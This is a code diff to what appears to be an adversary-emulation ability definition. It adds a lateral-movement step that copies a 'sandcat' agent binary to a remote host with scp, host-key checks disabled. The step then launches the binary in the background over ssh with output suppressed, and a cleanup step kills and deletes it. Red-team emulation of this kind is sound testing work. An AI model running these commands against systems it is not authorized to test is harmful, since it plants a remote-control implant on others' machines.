@@ -10,5 +10,8 @@
   executors:
     darwin:
       command: |
-        scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null #{files}/sandcat-linux #{remote.ssh.cmd}:/tmp
+        scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{files}/sandcat-linux #{remote.ssh.cmd}:~ &&
+        ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat-linux 1>/dev/null 2>/dev/null &'
+      cleanup: |
+        ssh -o ConnectTimeout=3 #{remote.ssh.cmd} '(rm sandcat-linux && pkill -f sandcat && rm sandcat-linux)'
       payload: sandcat-linux
